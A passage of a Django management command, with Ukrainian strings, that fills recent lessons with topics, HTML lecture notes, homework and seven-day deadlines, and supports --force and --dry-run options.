3. Виконати практичне завдання (варіант за номером у списку групи).
4. Підготуватися до контрольного тесту на наступному занятті.""",
]


class Command(BaseCommand):
    help = (
        "Наповнює лекції та уроки за останні два тижні детальним HTML-контентом: "
        "конспекти лекцій, теми, домашні завдання."
    )

    def add_arguments(self, parser):
        parser.add_argument(
            "--days",
            type=int,
            default=14,
            help="Кількість минулих днів (за замовчуванням: 14)",
        )
        parser.add_argument(
            "--force", action="store_true", help="Перезаписати існуючий вміст"
        )
        parser.add_argument(
            "--dry-run", action="store_true", help="Показати зміни без збереження"
        )

    def handle(self, *args, **options):
        days = options["days"]
        force = options["force"]
        dry_run = options["dry_run"]

        today = date.today()
        since = today - timedelta(days=days)

        lessons = Lesson.objects.filter(
            date__gte=since,
            date__lte=today,
            is_cancelled=False,
        ).select_related("subject", "evaluation_type")

        total = lessons.count()
        self.stdout.write(f"Знайдено {total} занять за {since} — {today}")

        if total == 0:
            self.stdout.write(
                self.style.WARNING(
                    "Занять не знайдено. Перевірте дати або запустіть seed-команду для створення занять."
                )
            )
            return

        updated = []
        upd_topic = upd_mat = upd_hw = 0

        for lesson in lessons:
            changed = False
            subj = lesson.subject.name
            etype = (
                (lesson.evaluation_type.name or "") if lesson.evaluation_type else ""
            )

            # ── Тема заняття ─────────────────────────────────────────────
            if not lesson.topic or force:
                topics = TOPICS.get(subj, DEFAULT_TOPICS)
                # вибираємо тему детерміновано по id, щоб повторні запуски
                # не змінювали теми без --force
                lesson.topic = topics[lesson.id % len(topics)]
                changed = True
                upd_topic += 1

            # ── Матеріали (HTML-конспект) ─────────────────────────────────
            if not lesson.materials or force:
                html_list = LECTURE_HTML.get(subj, DEFAULT_LECTURE_HTML)
                lesson.materials = html_list[lesson.id % len(html_list)]
                changed = True
                upd_mat += 1

            # ── Домашнє завдання ──────────────────────────────────────────
            if not lesson.homework or force:
                hw_pool = HOMEWORK_RICH.get(subj, DEFAULT_HOMEWORK)
                # для лекцій вибираємо перший варіант, для практик — другий
                if "Практична" in etype or "Лабораторна" in etype:
                    idx = (lesson.id + 1) % len(hw_pool)
                else:
                    idx = lesson.id % len(hw_pool)
                lesson.homework = hw_pool[idx]
                changed = True
                upd_hw += 1

            # ── Дедлайн: 7 днів після заняття, 23:59 ─────────────────────
            if lesson.deadline is None or force:
                deadline_date = lesson.date + timedelta(days=7)
                lesson.deadline = timezone.make_aware(
                    datetime.combine(deadline_date, dtime(23, 59))
                )
                changed = True

            if changed:
                updated.append(lesson)

        if dry_run:
            self.stdout.write(
                self.style.WARNING(
                    f"[DRY RUN] Буде оновлено {len(updated)} занять: "
                    f"тем={upd_topic}, матеріалів={upd_mat}, ДЗ={upd_hw}"
                )
            )
            for l in updated[:5]:
                self.stdout.write(f"  • {l.date} | {l.subject.name} | {l.topic[:60]}")
            return

        if updated:
            Lesson.objects.bulk_update(
                updated, ["topic", "materials", "homework", "deadline"]
            )

        self.stdout.write(
            self.style.SUCCESS(
                f"Готово! Оновлено {len(updated)} занять: "
                f"тем={upd_topic}, матеріалів={upd_mat}, ДЗ={upd_hw}"
            )
        )
